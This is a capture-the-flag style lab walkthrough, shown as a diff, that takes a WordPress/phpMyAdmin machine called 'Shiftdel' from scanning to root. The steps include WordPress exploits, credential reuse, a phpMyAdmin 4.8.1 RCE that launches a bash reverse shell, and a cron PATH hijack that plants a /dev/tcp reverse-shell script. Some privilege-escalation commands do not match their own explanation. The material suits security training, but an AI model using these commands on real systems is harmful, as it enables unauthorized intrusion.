@@ -1,0 +1,144 @@
+																							                     Shiftdel Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.173.174
+export IP=192.168.173.174
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+80/tcp   open  http
+8888/tcp open  sun-answerbook
+
+
+nmap -Pn -n -sC -sV -p22,80,8888 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: WordPress 4.9.6
+|_http-title: Shiftdel
+8888/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: phpMyAdmin
+Service Info: OS: Linux;
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Port 80
+wpscan --url http://$IP --disable-tls-checks --enumerate p --enumerate t --enumerate u
+
+User(s) Identified:
+admin
+intern
+
+Outdated theme: twentyfifteen
+
+Brute-force
+wpscan --url http://$IP --no-update --disable-tls-checks -U users.txt -P /usr/share/wordlists/rockyou.txt 
+
+nothing usefull found :(
+
+# Let's search for some online exploits, we are out of ideas
+
+searchsploit wordpress 4.9
+
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                       | multiple/webapps/47690.md
+
+cat multiple/webapps/47690.md
+
+In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:  
+
+# Aparently, if you add ?static=1&order=asc in the URL you might disclose additiona sensitive content.
+
+http://192.168.154.174/?static=1&order=asc
+
+Password: IntraPersonalVision349
+
+# Aparently this is the password for interns, since we have discovered the intern user, let's access the application.
+   Since this is a low privileged user, and we don't have access to areas where we could easily get shell, let's search for other public exploits.
+   
+WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                              | php/webapps/44949.txt
+
+# Exploitation Steps
+
+  1. Login to wordpress with privileges of an author or low privileged user as in our case.
+  2. Navigates to Media > Add New > Select Files > Open/Upload
+  3. Click Edit > Open Developer Console > Paste this exploit script
+  4. Execute the function, eg:  unlink_thumb("../../../../.htaccess") or unlink_thumb("../../../../wp-config.php"). In our case, htaccess does the job.
+  5. Try to access the base configuration file of the application.
+  
+curl http://$IP/wp-config.php
+  
+DB_NAME = wordpress
+DB_USER = wordpress
+DB_PASS=ThinnerATheWaistline348
+
+# Now that we have a set of credentials, let's try to login the in phpMyAdmin page on port 8888. Ok, credentials are working.
+
+wordpress
+ThinnerATheWaistline348
+
+# Now that we are in, we see that in the wp-users tables, we have a hash for the admin user: $P$BA1B4rhsKr3loZOR8ni74i2lY7ZOsC0
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                  # No luck :(
+
+# On the main page, we can see that we are running phpMyAdmin v 4.8.1. Let's see if we get anything with searchsploit
+
+searchsploit phpmyadmin 4.8.1
+
+phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                  | php/webapps/50457.py
+
+# Aparently there is, let's have a netcat listener opened.
+
+nc -lvnp 4444
+
+python 50457.py $IP 8888 / wordpress ThinnerATheWaistline348 "bash -c 'bash -i >/dev/tcp/192.168.45.5/4444 0>&1 2>&1'"
+
+# Got shell
+
+cat /home/tobias/local.txt                                        # Flag: 3fa7bcf9ebdc24812e2b27348591c2fc
+
+
+Privilege escalation
+
+ls -lsa /etc/cron*
+
+cat /etc/cron.d/wpclean
+
+HOME=/var/www/html/wordpress/wp-content/uploads
+PATH=~/bin:/usr/bin:/bin
+
+# in case the intern does something silly, delete all files with invalid image extension
+*/5 * * * * root /usr/bin/find . -type f -not -regex '.*\.\(jpg\|jpeg\|png\|gif\)' -exec bash -c "rm -f {}" \;
+
+# It appears that this script is intended to delete image files to clean up the WordPress uploads folder. One odd thing is that the PATH variable contains ~/bin. The tilde symbol will be interpreted by the system as the user's home directory. The find command references that it is checking its current directory with a single period.
+   The HOME variable is set to a directory within WordPress. This will be the directory used in place of the tilde and, therefore, will be the first place where rm will be checked for. This directory just so happens to be owned by www-data. Let's create a bin/ under uploads/ and make our own rm containing a Bash reverse shell.
+   
+cd /var/www/html/wordpress/wp-content/uploads
+
+# Since we don't have the bin directory already present, we need to create it
+mkdir /bin
+
+# Let's create a script that will be run the our cron job
+
+nano script
+#!/bin/bash
+/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.5/8888 0>&1'
+
+# Give it full rights or at least execute rights
+
+chmod 777 script
+
+# Now just wait for the cron job to run while having a netcat listener opened on port 8888
+
+nc -lvnp 8888
+connect to [192.168.45.5] from (UNKNOWN) [192.168.173.174] 36254
+bash: cannot set terminal process group (14631): Inappropriate ioctl for device
+bash: no job control in this shell
+root@shiftdel:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/proof.txt                                               # Flag: 3db1ed7f20e223896fde68f7623c7e01
